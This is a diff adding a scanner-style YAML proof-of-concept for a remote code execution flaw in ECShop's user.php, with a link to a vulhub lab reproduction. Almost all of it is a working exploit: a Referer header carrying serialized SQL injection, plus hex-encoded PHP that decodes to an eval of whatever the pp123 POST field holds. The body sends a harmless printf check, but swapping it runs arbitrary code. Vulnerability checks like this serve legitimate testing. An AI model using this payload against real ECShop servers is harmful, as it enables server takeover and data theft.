@@ -1,0 +1,17 @@
+name: poc-yaml-ecshop-rce
+set:
+  r1: randomInt(40000, 44800)
+  r2: randomInt(40000, 44800)
+rules:
+  - method: POST
+    path: /user.php
+    headers:
+      Referer: >-
+       45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:193:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b6576616c09286261736536345f6465636f64650928275a585a686243676b5831425055315262634841784d6a4e644b54733d2729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953aads
+      Content-Type: application/x-www-form-urlencoded
+    body: action=login&pp123=printf({{r1}}*{{r2}});
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+detail:
+  author: 凉风(http://webkiller.cn/)
+  links:
+    - https://github.com/vulhub/vulhub/blob/master/ecshop/xianzhi-2017-02-82239600/README.zh-cn.md
